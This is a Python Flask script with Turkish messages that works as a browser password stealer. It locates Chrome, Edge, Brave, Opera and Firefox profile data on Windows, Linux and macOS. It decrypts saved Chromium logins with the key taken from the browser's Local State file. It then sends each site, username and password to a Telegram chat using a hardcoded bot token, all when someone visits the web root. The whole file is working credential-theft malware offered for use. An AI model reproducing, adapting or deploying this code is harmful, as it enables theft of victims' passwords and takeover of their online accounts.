# app.py (TÜM TARAYICILAR)
from flask import Flask
import telebot
import os
import sqlite3
import shutil
import json
import base64
import time
import glob
import platform

app = Flask(__name__)
bot = telebot.TeleBot("8258388271:AAEr5lwYGZppBtSRy-c3wXCWu4Dr_GwASfI")
CHAT_ID = 7323434112

def get_browser_paths():
    system = platform.system()
    base = os.path.expanduser("~")
    paths = []
    if system == "Windows":
        # Chrome
        paths.append(os.path.join(base, "AppData/Local/Google/Chrome/User Data"))
        # Edge
        paths.append(os.path.join(base, "AppData/Local/Microsoft/Edge/User Data"))
        # Firefox
        paths.append(os.path.join(base, "AppData/Roaming/Mozilla/Firefox/Profiles"))
        # Brave
        paths.append(os.path.join(base, "AppData/Local/BraveSoftware/Brave-Browser/User Data"))
        # Opera
        paths.append(os.path.join(base, "AppData/Roaming/Opera Software/Opera Stable"))
    elif system == "Linux":
        paths.append(os.path.join(base, ".config/google-chrome"))
        paths.append(os.path.join(base, ".config/microsoft-edge"))
        paths.append(os.path.join(base, ".mozilla/firefox"))
        paths.append(os.path.join(base, ".config/BraveSoftware/Brave-Browser"))
        paths.append(os.path.join(base, ".config/opera"))
    elif system == "Darwin":
        paths.append(os.path.join(base, "Library/Application Support/Google/Chrome"))
        paths.append(os.path.join(base, "Library/Application Support/Microsoft Edge"))
        paths.append(os.path.join(base, "Library/Application Support/Firefox/Profiles"))
        paths.append(os.path.join(base, "Library/Application Support/BraveSoftware/Brave-Browser"))
    return paths

def decrypt_aes(key, encrypted):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        iv = encrypted[3:15]
        ciphertext = encrypted[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
        decryptor = cipher.decryptor()
        return (decryptor.update(ciphertext) + decryptor.finalize()).decode('utf-8', errors='ignore')
    except:
        return "[Decrypt hata]"

def extract_from_chromium(base_path, browser_name):
    sifreler = []
    for profile_path in glob.glob(os.path.join(base_path, "Profile *")) + [os.path.join(base_path, "Default")]:
        login_data = os.path.join(profile_path, "Login Data")
        if not os.path.exists(login_data):
            continue
        local_state = os.path.join(os.path.dirname(base_path), "Local State")
        if not os.path.exists(local_state):
            continue
        try:
            with open(local_state, 'r', encoding='utf-8') as f:
                ls = json.load(f)
            enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
            shutil.copy(login_data, "temp.db")
            conn = sqlite3.connect("temp.db")
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc in cur.fetchall():
                pwd = decrypt_aes(enc_key, enc)
                sifreler.append(f"{browser_name} - Profil: {os.path.basename(profile_path)}\nSite: {url}\nUser: {user}\nPass: {pwd}")
            conn.close()
            os.remove("temp.db")
        except:
            pass
    return sifreler

def extract_from_firefox(base_path):
    sifreler = []
    for profile in glob.glob(os.path.join(base_path, "*")):
        logins_json = os.path.join(profile, "logins.json")
        if not os.path.exists(logins_json):
            continue
        try:
            with open(logins_json, 'r') as f:
                data = json.load(f)
            for login in data.get("logins", []):
                url = login["hostname"]
                user = login["encryptedUsername"]
                passw = login["encryptedPassword"]
                sifreler.append(f"Firefox - Profil: {os.path.basename(profile)}\nSite: {url}\nUser: [encrypted]\nPass: [encrypted]")  # Firefox NSS decrypt ayrı kod
        except:
            pass
    return sifreler

@app.route('/')
def home():
    bot.send_message(CHAT_ID, "REİS, TÜM TARAYICILARDAN ŞİFRELER ÇEKİLİYOR... 🔑")
    browser_paths = get_browser_paths()
    all_sifreler = []
    for path in browser_paths:
        if "chrome" in path.lower() or "edge" in path.lower() or "brave" in path.lower() or "opera" in path.lower():
            browser_name = os.path.basename(os.path.normpath(path)).split(" ")[0]
            all_sifreler += extract_from_chromium(path, browser_name)
        elif "firefox" in path.lower():
            all_sifreler += extract_from_firefox(path)
    
    if not all_sifreler:
        bot.send_message(CHAT_ID, "Hiç tarayıcı bulunamadı veya şifre yok. Tarayıcıyı kapatıp tekrar dene.")
    else:
        for sifre in all_sifreler:
            bot.send_message(CHAT_ID, sifre)
            time.sleep(0.5)
        bot.send_message(CHAT_ID, f"✅ {len(all_sifreler)} ŞİFRE GÖNDERİLDİ! (Chrome yoksa Edge/Firefox'tan)")

    return "<h1>ŞİFRELER TELEGRAM'DA!</h1><p>Tarayıcıyı kapatıp tekrar dene.</p>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
